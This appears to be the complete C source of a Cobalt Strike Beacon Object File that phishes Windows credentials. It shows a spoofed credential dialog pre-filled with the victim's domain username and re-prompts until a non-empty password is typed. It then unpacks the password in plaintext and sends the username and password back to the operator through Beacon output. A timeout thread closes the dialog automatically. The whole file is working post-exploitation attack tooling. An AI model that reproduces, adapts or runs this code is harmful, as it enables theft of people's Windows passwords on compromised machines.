#define SECURITY_WIN32

#include <stdio.h>
#include <windows.h>
#include <wincred.h>
#include <Lmcons.h>
#include <security.h>
#include "credprompt.h"
#include "beacon.h"

#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "user32.lib")

typedef struct {
    UINT timeout;
    HANDLE hTimeoutEvent;
} TIMEOUT_STRUCT;




//https://github.com/outflanknl/C2-Tool-Collection/blob/main/BOF/Psx/SOURCE/Psx.c
HRESULT BeaconPrintToStreamW(_In_z_ LPCWSTR lpwFormat, ...) {
	HRESULT hr = S_FALSE;
	va_list argList;
	DWORD dwWritten = 0;

	if (g_lpStream <= (LPSTREAM)1) {
		hr = OLE32$CreateStreamOnHGlobal(NULL, TRUE, &g_lpStream);
		if (FAILED(hr)) {
			return hr;
		}
	}

	if (g_lpwPrintBuffer <= (LPWSTR)1) { 
		g_lpwPrintBuffer = (LPWSTR)MSVCRT$calloc(MAX_STRING, sizeof(WCHAR));
		if (g_lpwPrintBuffer == NULL) {
			hr = E_FAIL;
			goto CleanUp;
		}
	}

	va_start(argList, lpwFormat);
	if (!MSVCRT$_vsnwprintf_s(g_lpwPrintBuffer, MAX_STRING, MAX_STRING -1, lpwFormat, argList)) {
		hr = E_FAIL;
		goto CleanUp;
	}

	if (g_lpStream != NULL) {
		if (FAILED(hr = g_lpStream->lpVtbl->Write(g_lpStream, g_lpwPrintBuffer, (ULONG)MSVCRT$wcslen(g_lpwPrintBuffer) * sizeof(WCHAR), &dwWritten))) {
			goto CleanUp;
		}
	}

	hr = S_OK;

CleanUp:

	if (g_lpwPrintBuffer != NULL) {
		MSVCRT$memset(g_lpwPrintBuffer, 0, MAX_STRING * sizeof(WCHAR)); 
	}

	va_end(argList);
	return hr;
}

//https://github.com/outflanknl/C2-Tool-Collection/blob/main/BOF/Psx/SOURCE/Psx.c
VOID BeaconOutputStreamW() {
	STATSTG ssStreamData = { 0 };
	SIZE_T cbSize = 0;
	ULONG cbRead = 0;
	LARGE_INTEGER pos;
	LPWSTR lpwOutput = NULL;

	if (FAILED(g_lpStream->lpVtbl->Stat(g_lpStream, &ssStreamData, STATFLAG_NONAME))) {
		return;
	}

	cbSize = ssStreamData.cbSize.LowPart;
	lpwOutput = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, cbSize + 1);
	if (lpwOutput != NULL) {
		pos.QuadPart = 0;
		if (FAILED(g_lpStream->lpVtbl->Seek(g_lpStream, pos, STREAM_SEEK_SET, NULL))) {
			goto CleanUp;
		}

		if (FAILED(g_lpStream->lpVtbl->Read(g_lpStream, lpwOutput, (ULONG)cbSize, &cbRead))) {		
			goto CleanUp;
		}

		BeaconPrintf(CALLBACK_OUTPUT, "%ls", lpwOutput);
	}

CleanUp:
	if (g_lpStream != NULL) {
		g_lpStream->lpVtbl->Release(g_lpStream);
		g_lpStream = NULL;
	}

	if (g_lpwPrintBuffer != NULL) {
		MSVCRT$free(g_lpwPrintBuffer); 
		g_lpwPrintBuffer = NULL;
	}

	if (lpwOutput != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpwOutput);
	}
	return;
}


BOOL is_empty_or_whitespace(WCHAR *str) {
    if (str == NULL) {
        return TRUE;
    }

    while (*str) {
        if (!MSVCRT$iswspace(*str)) {
            return FALSE;
        }
        str++;
    }
    return TRUE;
}


BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
    WCHAR className[256] = {0};
    USER32$GetClassNameW(hWnd, className, sizeof(className) / sizeof(WCHAR));

    if (MSVCRT$wcscmp(className, L"Credential Dialog Xaml Host") == 0) {
        USER32$PostMessageW(hWnd, WM_CLOSE, 0, 0);
        return FALSE;
    }

    return TRUE;
}


DWORD WINAPI PromptWithTimeout(LPVOID lParam) {
    TIMEOUT_STRUCT *pTimeoutStruct = (TIMEOUT_STRUCT *)lParam;
    UINT timeout = pTimeoutStruct->timeout;
    HANDLE hTimeoutEvent = pTimeoutStruct->hTimeoutEvent;

    KERNEL32$Sleep(timeout * 1000);
    USER32$EnumWindows(EnumWindowsProc, 0);
    KERNEL32$SetEvent(hTimeoutEvent);

    return 0;
}


BOOL PromptForCreds(LPWSTR title, LPWSTR message, LPWSTR *username, LPWSTR *password, LPWSTR *domain, UINT timeout)
{
    PVOID packed_credentials = NULL;
    ULONG packed_credentials_size = 0;
	
	HANDLE hTimeoutEvent = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);

    // Get current username in DOMAIN\USERNAME format
    WCHAR domainUsername[DNLEN + UNLEN + 2];
    ULONG nSize = sizeof(domainUsername) / sizeof(WCHAR);
    if (SECUR32$GetUserNameExW(NameSamCompatible, domainUsername, &nSize)) {
        // Pack current username
        WCHAR prefilled_username[DNLEN + UNLEN + 2];
        MSVCRT$_snwprintf(prefilled_username, (sizeof(prefilled_username) / sizeof(WCHAR)) - 1, L"%s", domainUsername);

        CREDUI$CredPackAuthenticationBufferW(0, prefilled_username, L"", NULL, &packed_credentials_size);
        packed_credentials = MSVCRT$malloc(packed_credentials_size);
        CREDUI$CredPackAuthenticationBufferW(0, prefilled_username, L"", (PBYTE)packed_credentials, &packed_credentials_size);
    }
	
    BOOL bValidPassword = FALSE;
    DWORD result;
	
	TIMEOUT_STRUCT timeoutStruct;
	timeoutStruct.timeout = timeout;
	timeoutStruct.hTimeoutEvent = hTimeoutEvent;

	DWORD threadId;
	HANDLE hThread = KERNEL32$CreateThread(NULL, 0, PromptWithTimeout, (LPVOID)&timeoutStruct, 0, &threadId);
	
	BeaconPrintToStreamW(L"\nPrompt event log:\n");
	BeaconPrintToStreamW(L"==============================================\n");
	
    do {
        // Prompt for credentials
        CREDUI_INFOW credui_info = {0};
        credui_info.cbSize = sizeof(credui_info);
        credui_info.pszCaptionText = title;
        credui_info.pszMessageText = message;
		credui_info.hwndParent = NULL;
		
		HWND hWnd = USER32$GetForegroundWindow();
		if (hWnd != NULL) {
			credui_info.hwndParent = hWnd;
		}

        DWORD auth_package = 0;
        BOOL save_credentials = FALSE;
        ULONG out_credentials_size = 0;
        LPVOID out_credentials = NULL;

        result = CREDUI$CredUIPromptForWindowsCredentialsW(&credui_info, 0, &auth_package, packed_credentials, packed_credentials_size, &out_credentials, &out_credentials_size, &save_credentials, CREDUIWIN_GENERIC | CREDUIWIN_CHECKBOX);

        if (result == NO_ERROR)
        {
            *username = (LPWSTR)MSVCRT$malloc(CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR));
            *password = (LPWSTR)MSVCRT$malloc(CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR));
            *domain = (LPWSTR)MSVCRT$malloc(CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR));

            ULONG max_username = CREDUI_MAX_USERNAME_LENGTH;
            ULONG max_password = CREDUI_MAX_USERNAME_LENGTH;
            ULONG max_domain = CREDUI_MAX_USERNAME_LENGTH;
            CREDUI$CredUnPackAuthenticationBufferW(0, out_credentials, out_credentials_size, *username, &max_username, *domain, &max_domain, *password, &max_password);
	
            bValidPassword = !is_empty_or_whitespace(*password);
            if (!bValidPassword) {
                BeaconPrintToStreamW(L"[!] User tried to enter empty password\n");
            }
            MSVCRT$memset(out_credentials, 0, out_credentials_size);
            OLE32$CoTaskMemFree(out_credentials);
		}
		
		else {
			if (KERNEL32$WaitForSingleObject(hTimeoutEvent, 0) == WAIT_OBJECT_0) {
				BeaconPrintToStreamW(L"[!] Credential prompt timed out\n");
				break;
				
			} else {
				BeaconPrintToStreamW(L"[!] User tried to close the prompt\n");
			}
		}
	} while (!bValidPassword);
	
	KERNEL32$TerminateThread(hThread, 0);
	KERNEL32$CloseHandle(hThread);
	
	if (packed_credentials)
	{
	MSVCRT$memset(packed_credentials, 0, packed_credentials_size);
		MSVCRT$free(packed_credentials);
	}

	return bValidPassword;
}


int go(char *args, int len) {
	LPWSTR title = L"";
	LPWSTR message = L"";
    LPWSTR username = NULL;
    LPWSTR password = NULL;
	LPWSTR domain = NULL;
    UINT timer_seconds = 60;
	datap parser;
	
	BeaconDataParse(&parser, args, len);
	title = BeaconDataExtract(&parser, NULL);
	message = BeaconDataExtract(&parser, NULL);
	timer_seconds = BeaconDataInt(&parser, NULL);
	
	
    if (PromptForCreds(title, message, &username, &password, &domain, timer_seconds))
	{
        BeaconPrintToStreamW(L"[+] User entered something:\n\tUsername: %ls\n\tPassword: %ls\n", username, password);
		BeaconOutputStreamW();
		
		MSVCRT$memset(password, 0, MSVCRT$wcslen(password) * sizeof(WCHAR));
        MSVCRT$free(username);
        MSVCRT$free(password);
        MSVCRT$free(domain);
    }
    else
    {
		BeaconOutputStreamW();
        BeaconPrintf(CALLBACK_ERROR, "No credentials were obtained.\n");
    }

    return 0;
}

